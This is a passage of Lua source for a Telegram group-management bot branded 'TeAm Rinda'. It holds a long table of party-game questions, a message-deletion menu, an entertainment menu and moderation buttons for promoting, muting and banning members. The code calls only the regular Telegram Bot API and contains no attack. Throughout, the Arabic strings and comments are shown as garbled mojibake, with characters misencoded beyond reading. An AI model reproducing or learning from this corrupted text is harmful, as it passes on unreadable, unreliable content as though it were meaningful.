ุงูุฑุฌูุ','ูุงุฐุง ุชูุนููู ุงุฐุง ุชุนุฑุถุชู ููุชุญุฑุด ูู ูุจู ุดุฎุต ูุง..ุ','ุงุฐุง ููุช ุดุฎุตุงู ุบูู ูู ุชูุงูู ุนูู ุงูุฒูุงุฌ ูู ูุชุงุฉ ูููุฑุฉ..ุ','ูุง ูู ุฃูุซุฑ ุดุฆ ูุง ุชุณุชุทูุน ุชุญููู..ุ','ูุง ูู ููุงุท ุงูุถุนู ูู ุดุฎุตูุชู..ุ','ูู ุชูุงูู ุฃู ุฒูุฌุชู ุชุฏูุน ุงูุญุณุงุจ ูู ุฅุญุฏู ุงููุทุงุนู ูุฃูุช ููุฌูุฏุ','ูุงุฐุง ุชูุนู ูู ุฃูุชุดูุช ุงู ุฒูุฌุชู ุนูู ุนูุงูุฉ ุจุตุฏูููุ','ูุง ูู ุฃูุซุฑ ุตูุฉ ุชูุฑููุง ูู ุฒูุฌุชู..ุ','ุงุฐุง ูุงู ูุฏูู ูุฑุตุฉ ููุฎุฑูุฌ ูุน ูู ุณูู ุชุฎุฑุฌ ุฑุจุนู ุงู ุฒูุฌุชู..ุ','ูุงุฐุง ุชูุนู ุนูุฏูุง ุชุฑู ุฏููุน ุฒูุฌุชู..ุ','ุฅูู ุฃู ุงูุฑุฌุงู ุชูุฑูุฏูู ุฃู ูููู ุงูุชูุงุคูุ','ูู ูุฑุฉ ุฎูุฏุนุช ูู ุฃุดุฎุงุตูุ ูุซูุชู ูููู ุซูุฉู ุนููุงุกุ','ูู ูุง ุฒุงู ุฃุตุฏูุงุก ุงูุทูููุฉ ุฃุตุฏูุงุกู ูู ุญุชู ุงูุขูุ','ูู ุชุฑุบุจูู ูู ุฃู ูููู ุฎุทูุจู ูุณูููุงุ','ูู ูุฑุฉู ูุนูุช ุดูุฆูุง ูุง ุชุฑุบุจูู ูู ุงูุฅูุตุงุญ ุนููุ','ูู ุงุณุชุทุนุช ุฃู ุชูุญููู ุขูุงูู ุงูุนูููุฉ ูุงูุนุงุทููุฉุ','ุฃูุซุฑ ุดุฆ ูุฏูุช ุนูู ูุนูู..ุ','ูู ุชุดุนุฑูู ุฃูู ูุชุงุฉ ูุญุธูุธุฉ..ุ','ูู ุนูุงูุฉ ุงูุญุจ ุงูุชู ูุงูุช ูู ุตุบุฑูุ ูุงุฒุงูุช ูุณุชูุฑุฉุ','ูุง ูู ุฃูุซุฑ ุดุฆ ููุฑุญู ูู ูุฐู ุงูุญูุงุฉ..ุ','ูู ูุฑุฉ ุฃุฑุฏุช ุดุฑุงุก ููุงุจุณ ูุฃููุง ุฌูููุฉ ูููููุง ูุง ุชูุงุณุจู..ุ','ูู ุนุฏุฏ ุงููุฑุงุช ุงูุชู ููุช ูููุง ุจุฅุณุชุจุฏุงู ุดุฆ ุงุดุชุฑูุชู ููู ูุนุฌุจู ุจุนุฏ ุฐูู.ุ','ูู ูุฑุฉ ููุช ุจูุณุฑ ุงูุฑุฌูู ูู ุฃุฌู ุชูุงูู ุทุนุงูู ุงูููุถู..ุ','ูู ุชุนุฑุถุช ููุธูู ูููุงู ูุง ูุนูู ูุฏ ูู..ุ','ูู ูุฐุจุช ุนูู ูุงูุฏูู ูู ูุจู..ุ','ูู ุฎุฑุฌุชู ูุน ุดุฎุต ุชุนุฑูุชู ุนููู ูู ุฎูุงู ุงูุชูููุฑุงู ูู ูุจู..ุ','ูู ูู ุชูุฏู ุดุฎุต ูุงุฎุชู ูู ุฃุฌู ุฎุทุจุชูุง ููุงูุช ุจุฑูุถู ุชูุจููู ุจู..ุ','ููู ุชููููู ูุง ุฃุณุชุทูุน ุงูุนูุด ุจุฏููู..ุ','ูู ุนุฏุฏ ุงููุฑุงุช ุงูุชู ุชุนุฑุถุชู ูููุง ุฅูู ุฃุฒูุฉ ููุณูุฉ ูุฃุฑุฏุชู ุงูุตุฑุงุฎ ุจุฃุนูู ุตูุชู..ุ','ูุงุฐุง ุชููู ููุจุญุฑุ','ุฃุตุนุจ ุตูุฉ ูุฏ ุชุชูุงุฌุฏ ูู ุฑุฌูุ','ูุง ุฃุฌูู ุงูุญูุงุฉ ุจุฏูู ...ุ','ููุงุฐุง ูู ุชุชู ุฎุทุจุชู ุญุชู ุงูุขู..ุ','ูุณุจุฉ ุฑุถุงู ุนู ุงูุฃุดุฎุงุต ูู ุญููู ูุงููุชุฑุฉ ุ','ูุง ุงูุณูุก ูู ูุฐู ุงูุญูุงุฉ ุ','ุงููููุณ ุงู ุงูุญุจ ุ','ุฃุฌูู ุดูุก ุญุตู ูุนู ุฎูุงู ูุฐุง ุงูุงุณุจูุน ุ','ุณุคุงู ููุฑูุฒู ุ','ูู ูู ุญุณุงุจู ุงูุจููู ุ','ุดู ุนูุฏู ุงูู ูู ุงููุงุณ ุ','ุงูู ููุฏ ุงู ุจูุช ุงูู ุดูู ุชุณูู ุ','ุชูุถูู ุงูููุงุด ุงูุทููู ุงู ุชุญุจ ุงูุงุฎุชุตุงุฑ ุ','ุนุงุฏู ุชุชุฒูุฌ ุงู ุชุชุฒูุฌูู ูู ุฎุงุฑุฌ ุงูุนุดูุฑู ุ','ูู ูุฑู ุญุจูุช ุ','ุชุจุงุฏู ุงููุฑุงููุฉ ุจุงููุฑุงููุฉุ ููุง ุชุญุฑุฌู ุจุงูุทูุจ ุ','ููุจู ุนูู ููุจู ูููุง ุตุงุฑ ูููู ุชููููุง ุ','ุงูุซุฑ ุงููุชุงุจุนูู ุนูุฏู ุจุงู ุจุฑูุงูุฌ ุ','ูุณุจุฉ ุงููุนุงุณ ุนูุฏู ุญุงูููุง ุ','ูุณุจู ุงููุฏู ุนูุฏู ููู ูุซูุช ุจููู ุ','ุงูู ุดุฎุต ุชุนุฑูุช ุนููู ุจุงูุชูููุฑุงู ุจุนุฏู ููุฌูุฏ ุ','ุงุฐุง ูุฏููู ุดุฎุต ุถููู ุดูู ููููู ุ','ุงูุถู ุนูุฑ ููุฒูุงุฌ ุจุฑุฆูู ุ','ุงูุช ูู ุงูููุน ุงูู ุฏุงุฆูุง ููุบุฏุฑ ูู ุงูุฑุจ ุงููุงุณ ุงูู ุ','ูุงูู ุญููุงูู ุงูููุถู ุ','ุชุงุฑูุฎ ูููุงุฏู ุ','ูููู ุงูููุถู ุ','ุงูุช ูู ุงูููุน ุงูุนุงุทูู ูุงูู ูููุฏุฑ ููุชู ุงูุจุฏุงุฎูู ุ','ุงุฐุง ูุฏููู ุดุฎุต ุฎุงูู ููุฑูุฏ ูุฑุฌุนูู ุชูุจู ุ','ุดู ุจุงูุญูุงู ูุฎููู ุนุงูุด ูุญุฏ ุงูุงู ุ','ุชุญุจ ุงูููู ูู ุงูุดุบู ุ','ุงูุถู ููุงู ุฑุญุช ุนููู ุ','ุงุฎุชุตุฑ ุงููุงุถู ุจูููู ูุญุฏู ุ','ูู ุณุจู ูููุช ูุตุฑ ุนูู ุฃูุฑ ูุง ููู ุซู ุงูุชุดูุช ุฃูู ููุช ุนูู ุฎุทุฃ ุ','ุงูุซุฑ ูููุฉ ุชุฑูุน ุถุบุทู ุ','ูุน ุงู ุถุฏ ุณุจ ุงูุจูุช ููุฏูุงุน ุนู ููุณูุง ุ','ูููู ุธู ุงููุงุณ ุจูู ูู ูุงุ','ุนุจูุฑ ุนู ููุฏู ุจุตูุฑู ุ','ุงุบูุจ ููุชู ุถุงูุน ูู ุ','ููู ูุชูุฏุฑ ุชูุณุงู ุ','ุชุญุณ ุงูู ูุญุธูุธ ุจุงูุงุดุฎุงุต ุงูู ุญููู ุ','ุชุณุชุบู ููุช ูุฑุงุบู ุจุดูู ุ','ูุน ุงู ุถุฏ ููููุฉ ูุญุฏ ูุฏูู ู ุงุญุฏ ุ','ูู ุงุฎุฐูู ูุณุชุดูู ุงููุฌุงููู ููู ุชุซุจุช ููู ุงูู ุตุงุญู ุ','ูุบูู ุชูุงุญุธ ุฃู ุตูุชู ูุนุฌุจ ุงูุฌููุน ุฅูุง ุฃูุช ุ','ุงุฎุฑ ุฎูุงูู ุ','ุชุตุฑู ูุงุชุชุญููู ุ','ูู ููููู ุงููุฐุจ ูุงูุงุณุชูุฑุงุฑ ุจุงุฑุชูุงุจ ุงูุฃุฎุทุงุก ููุญุงููุฉ ููู ูุนุฏู ุงููุดู ุฃูู ูุฎุทุฆ ุ','ุงูุตู ุงุฎุฑ ุดู ูุณุฎุชู ุ','ุนูุฑู ุงูุชููุช ูู ุฃุญุฏ ุ','ูู ูุตูู ุฑุณุงูุฉ ุบูุฑ ูุชููุนุฉ ูู ุดุฎุต ูุฃุซุฑุช ููู ุ','โ-ูู ุงูุชููุช ุงูุนุตุง ุงูุณุญุฑูุฉ ูููู ูุงุญุฏ ูุงุฐุง ุณุชูุนู ุ','ุฌุงุจู ุทุงุฑู ุดุฎุต ุชูุฑู ุนูุฏู ุชุดุงุฑููู ููุง ุชููุนูู ุ','ุฃูููุฉ ููุช ุชุชููุงูุง ูุญููุชูุง ุ','ูู ุงูุชุนูุฏ ุนูู ุดุฎุต ูุงูุชุญุฏุซ ูุนู ุจุดูู ูููู ูุนุชุจุฑ ููุน ูู ุฃููุงุน ุงูุญุจ ุ','ูุณุจุฉ ุฌูุงู ุตูุชู ุ','ุตูุฉ ูุทูููุง ุนููู ุงูุดุฎุต ุงูููุถู ุ','ุดูู ูุฏูู ุจุงููุณุชูุจู ุงููุฑูุจ ุ','ุชุญุจ ุงููุฑุงุฆู ุ','ูููู ุชุชููู ุชููุจู ุจููุง ุ',
'ุฃุทูู ูุฏุฉ ูุถูุชูุง ุจุนูุฏ ุนู ุฃููู ุ','ูู ูุฌู ุนูุฏ ูููุงุฏู ุชุชููุน ูุฌูู ูุฏูุฉุ','ูุจุงู ุนููู ุงูุญุฒู ูู " ุตูุชู - ููุงูุญู','ููู ุชุดูู ููุณู ุจุนุฏ ุณูุชููุ','ูุด ูููููู ูู ููุง ุชุบูู ุ','ุนูุฏู ุญุณ ููุงูู ููุง ููุณูุฉุ','ููู ุชุชุตุฑู ูุน ุงูุดุฎุต ุงููุถููู ุ','ููู ูู ุฃุญูุงู ููุจูุ','ุญุงุฌุฉ ุชุดูู ููุณู ูุจุฏุน ูููุง ุ','ูุชู ุญุจูุชุ','ุดูุก ูู ู ุชุฐูุฑุชู ุชุจุชุณู ...','ุงูุนูุงูู ุงูุณุฑูู ุฏุงููุงู ุชููู ุญูููุ','ุตูุช ูุบูู ู ุชุญุจู','ูู ูุฌู ุนูุฏ ูููุงุฏู ุชุชููุน ูุฌูู ูุฏูุฉุ','ุงุฐุง ุงุญุฏ ุณุฃูู ุนู ุดูุก ู ุชุนุฑูู ุชููู ู ุงุนุฑู ููุง ุชุชููุณู ุ','ูุน ุงู ุถุฏ : ุงูููู ุงูุถู ุญู ูู ูุดุงูู ุงูุญูุงุฉุ','ูุณุงุญุฉ ูุงุฑุบุฉ (..............) ุงูุชุจ ุงู ุดูุก ุชุจูู','ุงุบุฑุจ ุงุณู ูุฑ ุนููู ุ','ุนูุฑู ูููุช ูููุณ ุงุญุฏ ุบูุฑ ุฌูุณูุ','ุงุฐุง ุบูุทุช ูุนุฑูุช ุงูู ุบูุทุงู ุชุญุจ ุชุนุชุฑู ููุง ุชุฌุญุฏุ','ูู ุนูุฏู ูููุณ ูุด ุงูุณูุงุฑุฉ ุงููู ุจุชุดุชุฑููุงุ','ูุด ุงุบุจู ุดูุก ุณููุชู ุ','ุดูุก ูู ุตุบุฑู ูุงุชุบูุฑ ูููุ','ูุด ููุน ุงูุฃููุงู ุงููู ุชุญุจ ุชุชุงุจุนูุ','ูุด ููุน ุงูุฃููุงู ุงููู ุชุญุจ ุชุชุงุจุนูุ','ุชุฌุงูู ุงุญุฏ ุนูู ุญุณุงุจ ูุตูุญุชู ุ','ุชุชูุจู ุงููุตูุญุฉ ูู ุงู ุดุฎุตุ','ูููู ูุงุณูู ูุนู ุงููุชุฑุฉ ูุฐู ุ','ูุชู ูุงุฒู ุชููู ูุง ุ','ุงูุซุฑ ุดูุก ุชุญุณ ุงูู ูุงุช ู ูุฌุชูุนูุงุ','ุชุคูู ุงู ูู "ุญูุจ ูู ุฃูู ูุธุฑุฉ" ููุง ูุง ุ.','ุชุคูู ุงู ูู "ุญูุจ ูู ุฃูู ูุธุฑุฉ" ููุง ูุง ุ.','ูู ุชุนุชูุฏ ุฃู ููุงูู ูู ูุฑุงูุจู ุจุดุบูุ','ุงุดูุงุก ุงุฐุง ุณููุชูุง ูุดุฎุต ุชุฏู ุนูู ุงูู ุชุญุจู ูุซูุฑ ุ','ุงุดูุงุก ุตุนุจ ุชุชูุจููุง ุจุณุฑุนู ุ','ุงูุชุจุงุณ ูุทููุ','ุฃูุซุฑ ุฌููุฉ ุฃุซุฑุช ุจู ูู ุญูุงุชูุ','ุนูุฏู ููุจูุง ูู ุดูุก ุ.',
'ุงูุซุฑ ููููู ุชุญุจูู ูุน ุจุนุถุ','ุฃุฌูู ุจูุช ุดุนุฑ ุณูุนุชู ...','ุณุจู ูุฑุงูุฏู ุดุนูุฑ ุฃูู ูู ุชุนุฏ ุชุนุฑู ููุณูุ','ุชุชููุน ููู ุงุญุฏ ุญุงูุฏ ุนููู ูููุฑูู ุ','ุฃุฌูู ุณูุฉ ูููุงุฏูุฉ ูุฑุช ุนููู ุ','ูู ูุฒุนุช/ู ูุตุฏูู/ู ููุงูู ูุงูู ุฏุฎู ูุด ุจุชุณูู/ููุ','ูุด ุชุญุณ ุงูู ุชุญุชุงุฌ ุงููุชุฑุฉ ูุงุฐู ุ','ูููู ุถุงุน ุนููุ','@ููุดู .. ุดุฎุต ุชุฎุงู ููู ุงุฐุง ุนุตุจ ...','ูููู ุนุงูู ูู ุฐููู ูุง ุชูุณุงู ููู ุฑูุนุชูุ','ุชุฎุชุงุฑ ุฃู ุชููู ุบุจู ุฃู ูุจูุญุ','ุงููููุณ ุงู ุงูุญุจ ุ','ุฃุฌูู ุจูุฏ ูู ูุงุฑุฉ ุขุณูุง ุจูุธุฑูุ','ูุง ุงูุฐู ูุดุบู ุจุงูู ูู ุงููุชุฑุฉ ุงูุญุงููุฉุ','ุงุญูุฑ ุงููุงุณ ูู ูู ...','ููู ูููู ุงูุณุนุงุฏู ุจุฑุงููุ','ุงุดูุงุก ุชูุชุฎุฑ ุงูู ู ุณููุชูุง ุ','ุชุฒุนูู ุงูุฏููุง ููุฑุถูู ุ','ูุด ุงูุญุจ ุจูุธุฑูุ','ุงูุถู ูุฏูู ูููู ุชูุงุณุจูุ','ูู ูู ุญุณุงุจู ุงูุจููู ุ','ูููุฉ ูุดุฎุต ุฃุณุนุฏู ุฑุบู ุญุฒูู ูู ูููู ูู ุงูุฃูุงู ุ','ุนูุฑู ุงูุชููุช ูู ุฃุญุฏ ุ!','ูุง ุงูุณูุก ูู ูุฐู ุงูุญูุงุฉ ุ','ุบููุฉ ุนูุฏู ูุนุงูุง ุฐูุฑูุงุช๐ต๐ป','/','ุฃูุถู ุตูุฉ ุชุญุจู ุจููุณูุ','ุงูุซุฑ ููุช ุชุญุจ ุชูุงู ููู ...','ุฃุทูู ูุฏุฉ ููุช ูููุง ูู ุณุงุนุฉุ','ุฃุตุนุจ ูุฑุงุฑ ูููู ุชุชุฎุฐู ุ','ุฃูุถู ุตูุฉ ุชุญุจู ุจููุณูุ','ุงูุซุฑ ููุช ุชุญุจ ุชูุงู ููู ...','ุฃูุช ูุญุจูุจ ุจูู ุงููุงุณุ ููุงูุฑููุ','ุฅุญุณุงุณู ูู ูุงููุญุธุฉุ','ุงุฎุฑ ุดูุก ุงููุชู ุ','ุชุดูู ุงูุบูุฑู ุงูุงููู ุงู ุญุจุ','ุงุฐูุฑ ูููู ูุงุชูุณุงู ุจุนูุฑูุ','ุงูุซุฑ ูุดุงููู ุจุณุจุจ ุ','ุงูู ูุงุชุตุญู ูู ุงูููู ููู ุชููููุ','ุขุฎุฑ ูุฑุฉ ุถุญูุช ูู ูู ููุจูุ','ูู ุงูุฌูุณูุฉ ุญุณุจ ููุงูุญู ูุด ุจุชููู ุฌูุณูุชูุ','ุงูุซุฑ ุดูุก ูุฑูุน ุถุบุทู','ุงุฐูุฑ ูููู ูุงุชูุณุงู ุจุนูุฑูุ','ูู ูุงููุง ูู  ุชูุงูู ุตูู ูุงุญุฏ ููุท ูู ุงูุทุนุงู ููุฏุฉ ุดูุฑ .',
'ููู ุชุดูู ุงูุฌูู ุฐุงุ','ุฑุฏุฉ ูุนูู ูู ูุฒุญ ูุนู ุดุฎุต ู ุชุนุฑูู ุ','ุงุญูุฑ ุงููุงุณ ูู ูู ...','ุชุญุจ ุงุจูู ููุง ุงูู','ุขุฎุฑ ูููู ูุณูุณู ูุงูุชูููู๐ฅุ','ุฃูุจุญ ุงููุจุญูู ูู ุงูุนูุงูุฉ: ุงูุบุฏุฑ ุฃู ุงูุฅููุงู๐คท๐ผุ','ูููุฉ ูุฃูุฑุจ ุดุฎุต ูููุจู๐คุ','ุญุท@ููุดู ูุดุฎุต ููููู "ุญุฑูุชู ูุงููุง ุฏุงุนู"๐ผ!','ุงุฐุง ุฌุงู ุฎุจุฑ ููุฑุญ ุงูู ูุงุญุฏ ุชุนููู ููู ููู๐๐ฝุ','ุทุจุน ูููู ูุฎููู ุชูุฑู ุดุฎุต ุญุชู ูู ููุช ุชูุญุจู๐๐ปโโ๏ธุ','ุงูุถู ุงูุงู ุงูุงุณุจูุน ุนูุฏู๐ุ','ูููููู ุงู ุงูุญูุงุฉ ุฏุฑูุณ ุ ูุงูู ุฃููู ุฏุฑุณ ุชุนููุชู ูู ุงูุญูุงุฉ๐ุ','ุชุงุฑูุฎ ูู ุชูุณุงู๐ุ','ุชุญุจ ุงูุตูู ูุงูุง ุงูุดุชุงุกโ๏ธโ๏ธุ','ุดุฎุต ุชุญุจ ุชุณุชูุฒู๐ุ','ุดูู ููุงุฏููู ูุงูุช ุตุบูุฑ (ุนูุงุฑุชู)๐ผ๐ปุ','ุนูู ููููู/ุฌ ููุง ููุจ ูุญุจู/ุฌโค๏ธุ','ุงูู ุณูุฑู ูู ููู ุฑุญ ุชูููโ๏ธุ','ูู ุนุฏุฏ ุงููู ูุนุทููู ุจููู๐นุ','ููุนูุฉ ูู ุงูุฃุดุฎุงุต ุชุชุฌูุจูู ูู ุญูุงุชูโุ','ุดุงุฑููุง ุตูุฑุฉ ุงู ููุฏูู ูู ุชุตููุฑูุ๐ธ','ูู ูู ุนุดุฑู ุชุนุทู ุญุธู๐ฉุ','ุงูุซุฑ ุจุฑูุงูุฌ ุชูุงุตู ุงุฌุชูุงุนู ุชุญุจู๐ุ','ูู ุงู ุฏููู ุงูุช๐ุ','ุงูุซุฑ ุฏููู ูุฏู ุชุณุงูุฑ ููุง๐ุ','ููููุฉ "ููุจุฑ ูููุณู" ูู ุชุคูู ุจุตุญุชูุง๐ง๐ผุ','ุชุนุชูุฏ ููู ุฃุญุฏ ูุฑุงูุจู๐ฉ๐ผโ๐ปุ','ูู ุจูุฏู ุชุบูุฑ ุงูุฒูู ุ ุชูุฏูู ููุง ุชุฑุฌุนู๐ฐุ','ูุดุฑูุจู ุงูููุถู๐นุ','โูู ุจูุตู ุขุฎุฑ ุงูุชุจุงุณ ูุณุฎุชูุ๐ญ','ูู ูุฒูู/ุฌ ุทููู/ุฌุ๐','ูู ูุงู ุนูุฑู/ุฌ ูุจู ูจ ุณููู๐ุ','ุฏููู ูุฏูุช ุงูู ุณุงูุฑุช ููุง๐ุ','ูู ูุงูู ูู ูฃ ุฃูููุงุช ุฑุงุญ ุชุชุญูู ุนุงูุณุฑูุน ุดูู ุชููู๐งโโ๏ธุ','โ- ูุณุจุฉ ุงุญุชูุงุฌู ููุนุฒูุฉ ูู 10๐ุ','ุดุฎุต ุชุญุจู ุญุธุฑู ุจุฏูู ุณุจุจ ูุงุถุญุ ุฑุฏุฉ ูุนูู๐งุ','ูุจุฏุฃ ูู ุงูุญูุงุฉ ุชุนุชูุฏ ุนููู ุฏุงุฆูุง๐ฏุ',
}  
Text = ''..RindaTeam[math.random(#RindaTeam)]..''
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุณุญ ุณุญูุงุชู" or text == "ูุณุญ ุฑุณุงุฆูู" then
local Msg = DevRio:get(Rinda..'Rio:Msg')
local Text = [[
โ๏ธฐูู ุฎูุงู ุงูุงุฒุฑุงุฑ ููููู ูุณุญ ุฑุณุงุฆูู ูุณุญูุงุชู
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุฑุณุงุฆูู โข",callback_data="/DelMsg:"..msg.sender_user_id_},{text="โข ูุณุญ ุณุญูุงุชู โข",callback_data="/DelEdit:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Msg or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and (text == "ุงูุชุณููู" or text == "ุงูุงูุฑ ุงูุชุณููู" or text == "ุชุณููู" or text == "ุชุณููุฉ" or text == "ุงูุชุณููุฉ") and ChCheck(msg) then
local Tsl = DevRio:get(Rinda..'Rio:Tsl')
local Text = [[
*โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูุงูุฑ ุงูุชุณููู โข โค*
-----------------------------------------
*โ๏ธฐุบูููู*
*โ๏ธฐุงุบููู*
*โ๏ธฐูุชุญุฑูู*
*โ๏ธฐุฑูููุณ*
*โ๏ธฐูููุฒ*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุบูููู โข",callback_data="/Song:"..msg.sender_user_id_},{text="โข ุงุบููู โข",callback_data="/mp3:"..msg.sender_user_id_}},{{text="โข ูุชุญุฑูู โข",callback_data="/gif:"..msg.sender_user_id_},{text="โข ุตูุฑู โข",callback_data="/photo:"..msg.sender_user_id_}},{{text="โข ุงููู โข",callback_data="/anime:"..msg.sender_user_id_},{text="โข ุฑูููุณ โข",callback_data="/remix:"..msg.sender_user_id_}},{{text="โข ูููุฒ โข",callback_data="/memz:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==('ุชุญูู') and ChCheck(msg) and Admin(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุญุณุงุจ ูุญุฐูู", 1, "md")
return false  
end
local Text = 'โ๏ธฐูู ุจุงุณุชุนูุงู ุงูุงุฒุฑุงุฑ ููุชุญูู ุงูุนุถู โข โค\nโ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')'
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑูุน ุฑุชุจู โข",callback_data=msg.sender_user_id_..":SetList:"..result.sender_user_id_},{text="โข ุชูุฒูู ุฑุชุจู โข",callback_data=msg.sender_user_id_..":RemList:"..result.sender_user_id_}},{{text="โข ูุชู โข",callback_data=msg.sender_user_id_..":Mute:"..result.sender_user_id_},{text="โข ุงูุบุงุก ูุชู โข",callback_data=msg.sender_user_id_..":UnMute:"..result.sender_user_id_}},{{text="โข ุญุธุฑ โข",callback_data=msg.sender_user_id_..":Ban:"..result.sender_user_id_},{text="โข ุงูุบุงุก ุญุธุฑ โข",callback_data=msg.sender_user_id_..":UnBan:"..result.sender_user_id_}},{{text="โข ุชููุฏ โข",callback_data=msg.sender_user_id_..":Tkeed:"..result.sender_user_id_},{text="โข ุงูุบุงุก ุชููุฏ โข",callback_data=msg.sender_user_id_..":UnTkeed:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==('ุฑูุน') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุญุณุงุจ ูุญุฐูู", 1, "md")
return false  
end
local Text = 'โ๏ธฐูู ุจุงุณุชุนูุงู ุงูุงุฒุฑุงุฑ ูุฑูุน ุงูุนุถู โข โค\nโ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')'
keyboard = {} 
if Sudo(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="โข ุฑูุน ูุงูู โข",callback_data=msg.sender_user_id_..":SetOwner:"..result.sender_user_id_},{text="โข ุฑูุน ูุทูุฑ โข",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text="โข ุฑูุน ูุทูุฑ ุซุงููู โข",callback_data=msg.sender_user_id_..":SetSecondSudo:"..result.sender_user_id_},{text="โข ุฑูุน ูุทูุฑ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":SetRioSudo:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioSudo(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="โข ุฑูุน ูุงูู โข",callback_data=msg.sender_user_id_..":SetOwner:"..result.sender_user_id_},{text="โข ุฑูุน ูุทูุฑ โข",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text="โข ุฑูุน ูุทูุฑ ุซุงููู โข",callback_data=msg.sender_user_id_..":SetSecondSudo:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SecondSudo(msg) then
